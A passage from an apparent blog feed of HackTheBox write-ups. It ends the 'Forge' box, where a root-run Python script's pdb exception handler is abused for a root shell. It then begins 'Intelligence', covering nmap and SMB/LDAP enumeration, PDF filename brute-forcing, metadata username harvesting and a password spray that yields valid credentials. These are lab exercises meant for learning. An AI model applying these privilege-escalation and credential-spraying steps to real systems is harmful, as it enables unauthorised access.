<p>Looking at the source code, this script is a simple tool for monitoring process, disk, and network sockets.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">random</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">subprocess</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pdb</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">port</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1025</span><span class="p">,</span> <span class="mi">65535</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">sock</span><span class="o">.</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">sock</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">sock</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Listening on localhost:</span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="n">clientsock</span><span class="p">,</span> <span class="n">addr</span><span class="p">)</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Enter the secret passsword: &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">clientsock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span> <span class="o">!=</span> <span class="s1">&#39;secretadminpassword&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Wrong password!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Welcome admin!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">What do you wanna do: </span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;[1] View processes</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;[2] View free memory</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;[3] View listening sockets</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;[4] Quit</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">option</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">clientsock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">option</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">subprocess</span><span class="o">.</span><span class="n">getoutput</span><span class="p">(</span><span class="s1">&#39;ps aux&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">            <span class="k">elif</span> <span class="n">option</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">subprocess</span><span class="o">.</span><span class="n">getoutput</span><span class="p">(</span><span class="s1">&#39;df&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">            <span class="k">elif</span> <span class="n">option</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">subprocess</span><span class="o">.</span><span class="n">getoutput</span><span class="p">(</span><span class="s1">&#39;ss -lnt&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">            <span class="k">elif</span> <span class="n">option</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Bye</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span>
</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">pdb</span><span class="o">.</span><span class="n">post_mortem</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">__traceback__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">finally</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">quit</span><span class="p">()</span></span></span></code></pre>
</figure><p>There&rsquo;s a hardcoded password of <code>secretadminpassword</code>. One that stands out in this code is the error/exception handling. When an exception triggered, the apps will call the Python debugger (<code>pdb</code>).  Since PDB is an interactive debugger, it is possible to <strong>run Python code</strong> during a debug session.</p>
<p>To enter the debug session, I need to intentionally cause an error to the tool and this can be achieved by sending a SIGINT.</p>
<h4 id="exploitation">Exploitation</h4>
<p>First, I&rsquo;ll run the script with <code>sudo</code> and I&rsquo;ll open another SSH sessions.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@forge:~$ sudo /usr/bin/python3 /opt/remote-manage.py
</span></span><span class="line"><span class="cl">Listening on localhost:51411</span></span></code></pre>
</figure><p>On the second SSH session, I&rsquo;ll connect to <code>26713</code> using <code>nc</code> and immediately send a SIGINT with <code>CTRL+C</code>.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@forge:~$ nc 127.0.0.1 <span class="m">51411</span>
</span></span><span class="line"><span class="cl">Enter the secret passsword: secretadminpassword
</span></span><span class="line"><span class="cl">Welcome admin!
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">What <span class="k">do</span> you wanna <span class="k">do</span>: 
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span> View processes
</span></span><span class="line"><span class="cl"><span class="o">[</span>2<span class="o">]</span> View free memory
</span></span><span class="line"><span class="cl"><span class="o">[</span>3<span class="o">]</span> View listening sockets
</span></span><span class="line"><span class="cl"><span class="o">[</span>4<span class="o">]</span> Quit
</span></span><span class="line"><span class="cl">^C</span></span></code></pre>
</figure><p>On the first SSH session, it&rsquo;s now has the Pdb prompt (debug session).</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@forge:/opt$ sudo /usr/bin/python3 /opt/remote-manage.py
</span></span><span class="line"><span class="cl">Listening on localhost:51411
</span></span><span class="line"><span class="cl">invalid literal <span class="k">for</span> int<span class="o">()</span> with base 10: b<span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">&gt; /opt/remote-manage.py<span class="o">(</span>27<span class="o">)</span>&lt;module&gt;<span class="o">()</span>
</span></span><span class="line"><span class="cl">-&gt; <span class="nv">option</span> <span class="o">=</span> int<span class="o">(</span>clientsock.recv<span class="o">(</span>1024<span class="o">)</span>.strip<span class="o">())</span>
</span></span><span class="line"><span class="cl"><span class="o">(</span>Pdb<span class="o">)</span> </span></span></code></pre>
</figure><p>Since it&rsquo;s a root process, I&rsquo;ve full access now on the system.</p>
<p><div class="img-container"><img src="imgs/image-20221015130859441.png" alt="image-20221015130859441"  /></div>
</p>
<p>I&rsquo;ll run <code>os.system('/bin/bash')</code> to spawn root shell and grab the root flag.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">(</span>Pdb<span class="o">)</span> os.system<span class="o">(</span><span class="s1">&#39;/bin/bash&#39;</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">root@forge:/opt# ls -l /root/root.txt 
</span></span><span class="line"><span class="cl">-rw------- <span class="m">1</span> root root <span class="m">33</span> Oct <span class="m">15</span> 03:08 /root/root.txt
</span></span><span class="line"><span class="cl">root@forge:/opt# 
</span></span><span class="line"><span class="cl">root@forge:/opt# cat /root/root.txt 
</span></span><span class="line"><span class="cl">73930b...<span class="o">[</span>SNIP<span class="o">]</span>...</span></span></code></pre>
</figure>]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Intelligence</title>
      <link>https://fahmifj.github.io/ctf/hackthebox/intelligence/</link>
      <pubDate>Mon, 19 Sep 2022 01:01:51 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/ctf/hackthebox/intelligence/</guid>
      <description>Intelligence brings some cool enumeration and exploitation techniques to own Active Directory. It starts by enumerating a website and launching a brute-force attack to obtain several PDF files. One of these files contains a default password for a new account. By spraying this password across a list of usernames extracted from the PDFs&amp;rsquo; metadata, a valid combination is discovered. In the file shares, there&amp;rsquo;s a scheduled PowerShell which sends a HTTP request to any subdomain under intelligence.</description>
      <content:encoded><![CDATA[<p><a href="https://app.hackthebox.eu/machines/Intelligence/"target="_blank" rel="noopener noreferrer"
>Intelligence</a> brings some cool enumeration and exploitation techniques to own Active Directory. It starts by enumerating a website and  launching a brute-force attack to obtain several PDF files. One of these files contains a default password for a new account. By spraying this  password across a list of usernames extracted from the PDFs&rsquo; metadata, a valid combination is discovered. In the file shares, there&rsquo;s a scheduled PowerShell which sends a HTTP request to any subdomain under <code>intelligence.htb</code>. By creating a new subdomain record, it is possible to capture the requester&rsquo;s hash, which can be cracked offline. Bloodhound analysis reveals that the user has permission to read the password of a GMSA  account, which has delegation rights to a service. These permissions can be exploited for privilege escalation to domain admin.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>User enumeration via file metadata</li>
<li>ADI DNS attack</li>
<li>AD</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Impacket</li>
<li>BloodHound</li>
<li>dnstool.py</li>
<li>gMSADumper.py</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>Port scanning with <code>nmap</code> reveals a bunch of ports open. Some interesting ports to dig into here are 445, 389, and 80.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.34» 
</span></span><span class="line"><span class="cl">$ nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49423,49667,49691,49709,49714 -sC -sV -oA nmap/10-tcp-allport-script-intelligence 10.10.10.248
</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-07-14 00:22 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.248
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.30s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT      STATE SERVICE       VERSION
</span></span><span class="line"><span class="cl">53/tcp    open  domain        Simple DNS Plus
</span></span><span class="line"><span class="cl">80/tcp    open  http          Microsoft IIS httpd 10.0
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Potentially risky methods: TRACE
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-IIS/10.0
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Intelligence
</span></span><span class="line"><span class="cl">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server time: 2021-07-14 11:22:29Z<span class="o">)</span>
</span></span><span class="line"><span class="cl">135/tcp   open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span class="line"><span class="cl">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: intelligence.htb0., Site: Default-First-Site-Name<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.intelligence.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2021-04-19T00:43:16
</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2022-04-19T00:43:16
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2021-07-14T11:24:04+00:00<span class="p">;</span> +7h00m03s from scanner time.
</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds?
</span></span><span class="line"><span class="cl">464/tcp   open  kpasswd5?
</span></span><span class="line"><span class="cl">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span class="line"><span class="cl">636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: intelligence.htb0., Site: Default-First-Site-Name<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.intelligence.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2021-04-19T00:43:16
</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2022-04-19T00:43:16
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2021-07-14T11:24:03+00:00<span class="p">;</span> +7h00m02s from scanner time.
</span></span><span class="line"><span class="cl">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: intelligence.htb0., Site: Default-First-Site-Name<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.intelligence.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2021-04-19T00:43:16
</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2022-04-19T00:43:16
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2021-07-14T11:24:04+00:00<span class="p">;</span> +7h00m03s from scanner time.
</span></span><span class="line"><span class="cl">3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: intelligence.htb0., Site: Default-First-Site-Name<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.intelligence.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2021-04-19T00:43:16
</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2022-04-19T00:43:16
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2021-07-14T11:24:03+00:00<span class="p">;</span> +7h00m02s from scanner time.
</span></span><span class="line"><span class="cl">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
</span></span><span class="line"><span class="cl">9389/tcp  open  mc-nmf        .NET Message Framing
</span></span><span class="line"><span class="cl">49423/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49667/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span class="line"><span class="cl">49709/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49714/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">Service Info: Host: DC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Host script results:
</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: mean: 7h00m02s, deviation: 0s, median: 7h00m02s
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   2.02: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled and required
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2021-07-14T11:23:25
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: N/A
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 104.01 seconds</span></span></code></pre>
</figure><p><code>Nmap</code> results also reveal the some domain names. I&rsquo;ll add these to my <code>/etc/hosts</code>.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">10.10.10.248 dc.intelligence.htb intelligence.htb</span></span></code></pre>
</figure><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-445---smb">TCP 445 - SMB</h3>
<p>When approaching an AD box, I would definitely check for anonymous login on SMB.</p>
<p>It&rsquo;s allowed but nothing to see here.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.34» 
</span></span><span class="line"><span class="cl">$ smbclient -N -L //10.10.10.248/
</span></span><span class="line"><span class="cl">Anonymous login successful
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        Sharename       Type      Comment
</span></span><span class="line"><span class="cl">        ---------       ----      -------
</span></span><span class="line"><span class="cl">SMB1 disabled -- no workgroup available</span></span></code></pre>
</figure><h3 id="tcp-389---ldap">TCP 389 - LDAP</h3>
<p>On LDAP, I can only retrieve the naming contexts.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ ldapsearch -LLL -x -h 10.10.10.248 -s base namingContexts
</span></span><span class="line"><span class="cl">dn:
</span></span><span class="line"><span class="cl">namingContexts: <span class="nv">DC</span><span class="o">=</span>intelligence,DC<span class="o">=</span>htb
</span></span><span class="line"><span class="cl">namingContexts: <span class="nv">CN</span><span class="o">=</span>Configuration,DC<span class="o">=</span>intelligence,DC<span class="o">=</span>htb
</span></span><span class="line"><span class="cl">namingContexts: <span class="nv">CN</span><span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>intelligence,DC<span class="o">=</span>htb
</span></span><span class="line"><span class="cl">namingContexts: <span class="nv">DC</span><span class="o">=</span>DomainDnsZones,DC<span class="o">=</span>intelligence,DC<span class="o">=</span>htb
</span></span><span class="line"><span class="cl">namingContexts: <span class="nv">DC</span><span class="o">=</span>ForestDnsZones,DC<span class="o">=</span>intelligence,DC<span class="o">=</span>htb
</span></span><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ ldapsearch -LLL -x -h 10.10.10.248 -b <span class="s2">&#34;dc=intelligence,dc=htb&#34;</span>
</span></span><span class="line"><span class="cl">Operations error <span class="o">(</span>1<span class="o">)</span>
</span></span><span class="line"><span class="cl">Additional information: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this operation a successful <span class="nb">bind</span> must be completed on the connection., data 0, v4563</span></span></code></pre>
</figure><h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>The website hosted on this machine is a static site with no further information to dig in.</p>
<p><div class="img-container"><img src="imgs/image-20210714112254614.png" alt="image-20210714112254614"  /></div>
</p>
<p>In the next section, there are two download buttons.</p>
<p><div class="img-container"><img src="imgs/image-20210714112325301.png" alt="image-20210714112325301"  /></div>
</p>
<p>These buttons point to two PDF files. The file contents don&rsquo;t seem to be important, but in each document&rsquo;s properties there&rsquo;s a potential username.</p>
<p>PDF 1: <code>http://intelligence.htb/documents/2020-01-01-upload.pdf</code></p>
<p><div class="img-container"><img src="imgs/image-20210714113015135.png" alt="image-20210714113015135"  /></div>
</p>
<p>PDF 2: <code>http://intelligence.htb/documents/2020-01-01-upload.pdf</code></p>
<p><div class="img-container"><img src="imgs/image-20210714113121646.png" alt="image-20210714113121646"  /></div>
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="access-as-tifannymolina">Access as Tifanny.Molina</h3>
<h4 id="grabbing-more-pdfs">Grabbing more PDFs</h4>
<p>Seeing the filename with pattern <code>YYYY-MM-DD</code> eventually led me to think &ldquo;Will incrementing the date give me another pdf?&rdquo;.</p>
<p>The answer is yes, it does!</p>
<p><div class="img-container"><img src="imgs/image-20210716081606506.png" alt="image-20210716081606506"  /></div>
</p>
<p>From here, I&rsquo;ll write a script to brute-force the other PDFs with <code>YYYY-MM-DD</code> timestamp pattern.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="cp">#!/bin/sh
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> month in <span class="o">{</span>01..12<span class="o">}</span>
</span></span><span class="line"><span class="cl"> <span class="k">do</span> 
</span></span><span class="line"><span class="cl">  <span class="k">for</span> day in <span class="o">{</span>01..31<span class="o">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">do</span>
</span></span><span class="line"><span class="cl">     wget -q <span class="s2">&#34;http://10.10.10.248/documents/2020-</span><span class="nv">$month</span><span class="s2">-</span><span class="nv">$day</span><span class="s2">-upload.pdf&#34;</span> 2&gt;/dev/null
</span></span><span class="line"><span class="cl">  <span class="k">done</span>
</span></span><span class="line"><span class="cl"> <span class="k">done</span></span></span></code></pre>
</figure><p>And here&rsquo;s what I got.</p>
<p><div class="img-container"><img src="imgs/image-20210716083456661.png" alt="image-20210716083456661"  /></div>
</p>
<p>Alternatively, I can use <code>wget</code> with brace expansion:</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ wget -q http://10.10.10.248/documents/2020-<span class="o">{</span>01..12<span class="o">}</span>-<span class="o">{</span>01..31<span class="o">}</span>-upload.pdf</span></span></code></pre>
</figure><h4 id="harvest-username-via-pdf-metadata">Harvest Username via PDF Metadata</h4>
<p>It&rsquo;s possible to harvest the creator name from the metadata to make a list of usernames.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «loot» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ exiftool * <span class="p">|</span> grep -i creator <span class="p">|</span> cut -d <span class="s1">&#39;:&#39;</span> -f2 <span class="p">|</span> cut -d <span class="s1">&#39; &#39;</span> -f2 <span class="p">|</span> sort <span class="p">|</span> uniq <span class="p">|</span> tee ../users.list 
</span></span><span class="line"><span class="cl">Anita.Roberts
</span></span><span class="line"><span class="cl">Brian.Baker
</span></span><span class="line"><span class="cl">Brian.Morris
</span></span><span class="line"><span class="cl">Daniel.Shelton
</span></span><span class="line"><span class="cl">Danny.Matthews
</span></span><span class="line"><span class="cl">Darryl.Harris
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...</span></span></code></pre>
</figure><p>The first idea to come with the username list is to perform <a href="/hackthebox/forest/#asrep-roasting"target="_blank" rel="noopener noreferrer"
>AS-REP Roasting</a> attack. I&rsquo;ve tried it but no luck there.</p>
<h4 id="pdf-content-examination">PDF Content Examination</h4>
<p>I discovered two non-<em>Lorem Ipsum</em> files by manually examining the PDF contents.</p>
<p>The first one is <code>2020-06-04-upload.pdf</code>, it contains the default password for new accounts in Intelligence Corp.</p>
<p><div class="img-container"><img src="imgs/image-20210716090147601.png" alt="image-20210716090147601"  /></div>
</p>
<p>The second one is <code>2020-06-04-upload.pdf</code>, it contains some internal information that will be useful later.</p>
<p><div class="img-container"><img src="imgs/image-20210716084253574.png" alt="image-20210716084253574"  /></div>
</p>
<h4 id="password-spray">Password Spray</h4>
<p>From here, I can spray the password to the username list I have harvested earlier via <code>rpcclient</code>.  This attack returns one valid pair <code>Tiffany.Molina:NewIntelligenceCorpUser9876</code>.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.97» 
</span></span><span class="line"><span class="cl">$ rpcspray users.list password.list 10.10.10.248 <span class="p">|</span> grep -v <span class="s1">&#39;NT_STATUS_LOGON_FAILURE&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying: <span class="s1">&#39;Anita.Roberts:NewIntelligenceCorpUser9876&#39;</span> 
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying: <span class="s1">&#39;Brian.Baker:NewIntelligenceCorpUser9876&#39;</span> 
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying: <span class="s1">&#39;Brian.Morris:NewIntelligenceCorpUser9876&#39;</span> 
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying: <span class="s1">&#39;Tiffany.Molina:NewIntelligenceCorpUser9876&#39;</span> 
</span></span><span class="line"><span class="cl">Account Name: Tiffany.Molina, Authority Name: intelligence
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying: <span class="s1">&#39;Travis.Evans:NewIntelligenceCorpUser9876&#39;</span> 
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying: <span class="s1">&#39;Veronica.Patel:NewIntelligenceCorpUser9876&#39;</span> 
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying: <span class="s1">&#39;William.Lee:NewIntelligenceCorpUser9876&#39;</span> </span></span></code></pre>
</figure><h4 id="smb-revisit">SMB Revisit</h4>
<p>Enumerating SMB with <code>smbmap</code> now returns a list of shares that are accessible by Tifanny.</p>
<figure class="highlight">
